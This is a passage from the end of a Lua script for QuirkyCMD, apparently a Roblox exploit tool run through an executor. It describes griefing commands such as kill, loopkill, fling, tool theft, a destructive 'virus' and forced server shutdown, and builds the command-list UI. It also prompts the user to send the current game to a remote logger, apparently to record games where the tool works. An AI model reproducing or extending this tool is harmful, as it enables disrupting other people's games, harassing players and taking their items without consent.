			["shutdown"] = "Deletes all players (including local) to force a shutdown.",
			["silentkill"] = "Same as kill, but also deletes the character afterward.",
			["sink"] = "Deletes the humanoid from players, disabling movement.",
			["skydive"] = "Teleports a player high into the air and lets them fall.",
			["stealtools"] = "Steals tools from another player’s character after killing them.",
			["stripidentity"] = "Executes naked, bald, and noface on a target.",
			["torsofling"] = "Uses the torso to fling people by adding velocity.",
			["unadmin"] = "Grants or removes admin permissions",
			["unban"] = "Removes players from the ban list.",
			["unbang"] = "Stops the bang animation.",
			["unclickdelete"] = "Disables the click-to-delete mode.",
			["unfly"] = "Disables fly mode and restores default movement.",
			["unkickaura"] = "Disables automatic kicking of nearby players.",
			["unkillaura"] = "Disables automatic killing of nearby players.",
			["unlockws"] = "Stops workspace anti-creation protection (lockws).",
			["unloopkill"] = "Removes players from the loopkill list.",
			["unowner"] = "Removes a player's owner privileges.",
			["unserverlock"] = "Disables the server lock.",
			["unsit"] = "Forces players to stand by deleting seat welds.",
			["untorsofling"] = "Disables torso fling mode.",
			["unview"] = "Resets the camera from spectating another player.",
			["unvirus"] = "Cancels the effects of virus.",
			["unweldws"] = "Deletes all Welds, Attachments, and Motor6Ds from workspace parts.",
			["view"] = "Changes your camera to follow the target player.",
			["virus"] = "Infects players or the workspace with destructive behavior.",
			["walkspeed"] = "Sets your walk speed.",
			["wither"] = "Slowly deletes limbs from players over time.",
			["witherws"] = "Slowly deletes workspace parts over time.",
			["close"] = "Safely shuts down QuirkyCMD by destroying the UI and disconnecting all events.",
		}
	
		--[[right scaling and creation of the command list with its description.]]--
		for _, v in ipairs(commands) do
			local level = v.securityLevel
			local name = v.name
			local clone = cmdTemplate:Clone()
			local desc = cmdData[name:lower()] or "No description available"
	
			clone.Text = name .. ` ({rankNames[level]}) - ` .. desc
			clone.Font = Enum.Font.Gotham
			clone.TextSize = 13
			clone.TextColor3 = Color3.new(1, 1, 1)
			clone.TextWrapped = true
			clone.TextScaled = false  
			clone.TextXAlignment = Enum.TextXAlignment.Left
			clone.TextYAlignment = Enum.TextYAlignment.Top
			clone.LineHeight = 1.1
	
			clone.Size = UDim2.new(1, 0, 0, 40)
			clone.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			clone.BorderSizePixel = 0
			clone.Visible = true
	
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 6)
			corner.Parent = clone
	
			local padding = Instance.new("UIPadding")
			padding.PaddingTop = UDim.new(0, 5)
			padding.PaddingBottom = UDim.new(0, 5)
			padding.PaddingLeft = UDim.new(0, 10)
			padding.PaddingRight = UDim.new(0, 10)
			padding.Parent = clone
			clone.Parent = cmdsList
		end
	
	
		closeButton.MouseButton1Click:Connect(function()
			cmdsFrame.Visible = false
		end)
	
	
		--[[Add drag functionality]]--
		local dragging
		local dragInput
		local dragStart
		local startPos
	
		local lastMousePos
		local lastGoalPos
		local dragSpeed = 20
	
		local function update(dt)
			if not (startPos) then return end
			if not (dragging) and (lastGoalPos) then
				cmdsFrame.Position = UDim2.new(startPos.X.Scale, lerp(cmdsFrame.Position.X.Offset, lastGoalPos.X.Offset, dt * dragSpeed), startPos.Y.Scale, lerp(cmdsFrame.Position.Y.Offset, lastGoalPos.Y.Offset, dt * dragSpeed))
				return 
			end
	
			local delta = (lastMousePos - uis:GetMouseLocation())
			local xGoal = (startPos.X.Offset - delta.X)
			local yGoal = (startPos.Y.Offset - delta.Y)
			lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
			cmdsFrame.Position = UDim2.new(startPos.X.Scale, lerp(cmdsFrame.Position.X.Offset, xGoal, dt * dragSpeed), startPos.Y.Scale, lerp(cmdsFrame.Position.Y.Offset, yGoal, dt * dragSpeed))	
		end
	
		cmdsFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = cmdsFrame.Position
				lastMousePos = uis:GetMouseLocation()
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
	
		cmdsFrame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
	
		table.insert(genv.connections,rs.Heartbeat:Connect(update))
	
		--[[send to game logger]]--
		if not inDatabase then
			local function promptCallback(answer)
				if answer == "No" then return end
				local sg = localPlayer:FindFirstChildOfClass("StarterGear")
				if sg then
					delete(sg)
					task.wait(checkTime + mobileOffset)
				end
				if (sg and sg.Parent == localPlayer) or (isTesting == false and game:GetService("GuiService"):GetErrorCode() ~= Enum.ConnectionError.OK) then return notify("Logger error", "Game could not be logged.", 10) end
				sendGame()
				debugPrint("game sent to server")
			end
	
			local bindable = Instance.new("BindableFunction")
			bindable.OnInvoke = promptCallback
	
			sgui:SetCore("SendNotification", {
				Title = "QuirkyCMD";
				Text = "would you like to log this game? (PLEASE TEST COMMANDS BEFORE CLICKING YES)",
				Duration = 300,
				Button1 = "Yes",
				Button2 = "No",
				Icon = "rbxassetid://73191850208831",
				Callback = bindable
			})
	
	
		end
	
		debugPrint("QuirkyCMD loaded successfully!")
	end)
end;
task.spawn(C_28);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_2a()
local script = G2L["2a"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Frame1.Visible = false
		script.Parent.Parent.Parent.Frame3.Visible = true
		script.Parent.Parent.Parent.Frame3.Position = script.Parent.Parent.Parent.Frame.Position
	end)
end;
task.spawn(C_2a);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_2c()
local script = G2L["2c"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Frame2.Visible = true
	end)
end;
task.spawn(C_2c);

return G2L["1"], require;
